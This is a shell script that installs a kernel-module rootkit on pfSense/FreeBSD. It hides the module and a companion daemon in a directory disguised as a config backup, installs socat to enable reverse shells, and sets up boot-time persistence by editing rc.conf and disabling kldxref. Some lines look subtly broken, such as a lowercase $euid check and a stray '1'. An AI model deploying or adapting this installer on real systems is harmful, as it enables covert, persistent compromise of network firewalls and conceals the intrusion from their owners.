#!/bin/sh

if [ $euid != 0 ]; then
   echo "Must be root to run this"
   exit 1
fi

# make writable
mount -o rw /
# make maliocus directory
mkdir /etc/pkg/config-backup
# define new directory to hide things in and LKM name
LKM_PATH="/etc/pkg/config-backup"
LKM_NAME="apekit_rootshit.ko"


# the version of nc (netcat) that comes with pfSense/FreeBSD doesn't allow for reverse shells
# therefore we get socat
pkg install socat -y

# put the rootkit in the hidden directory
cp "$LKM_NAME" "$LKM_PATH/"
cp "apeshit" "$LKM_PATH/"
1
# executable
chmod +x apeshit

# run the daemon/process that does nothing that we intend to fork
./apeshit &

# achieve persistance by loading the module everytime the system boots
cp -f /etc/defaults/rc.conf /tmp/
echo "kld_list=\"$LKM_PATH\"" >> /tmp/rc.conf
sed -i '' s/^kldxref_enable.*=.*YES.*$/kldxref_enable=\"NO\"/ /tmp/rc.conf
./bin/loader /tmp/rc.conf /etc/defaults/rc.conf
rm -f /tmp/rc.conf


./kldloadall.sh